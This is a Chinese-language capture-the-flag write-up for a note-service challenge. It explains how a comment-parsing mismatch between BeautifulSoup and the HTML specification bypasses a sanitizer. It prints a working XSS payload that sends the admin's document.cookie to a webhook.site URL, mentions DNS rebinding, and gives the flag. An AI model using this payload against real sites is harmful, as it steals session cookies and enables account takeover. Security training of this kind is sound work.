# 题目描述

Check out my new note service! It supports all the formatting you'll ever need.

Flag is in admin's cookies.

# 解决方案

从提供的源码中可以看到，服务器会使用[BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/)解析用户提供的数据，然后只允许几个安全的tag，且不能有任何属性值，因此直接注入payload是不可能成功的，这里绕过的思路是BeautifulSoup的解析和最新版的[HTML规范](https://html.spec.whatwg.org/multipage/syntax.html#comments)有些许不同的地方，比如注释的语法，在BeautifulSoup看来`<!--><script>alert(1)</script>-->`中的`><script>alert(1)</script>`是注释部分，在最新版的HTML规范看来，`<!-->`是一个注释，后面内容就不再是注释，可以拿到admin的cookie的payload如下：

```html
<!--><script>
let x = document.cookie;
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", 'https://webhook.site/3f4cdacb-fff8-4284-89e2-c9e74212f26b?a=' + x, false );
xmlHttp.send( null );
console.log(xmlHttp.responseText);
</script>-->
```
因为admin的请求没有使用同源限制，因此上述payload可以直接拿到cookie，如果开启了同源限制，需要使用[DNS重绑定技术](https://www.freebuf.com/articles/web/318273.html)绕过同源限制。

```
irisctf{security_by_option}
```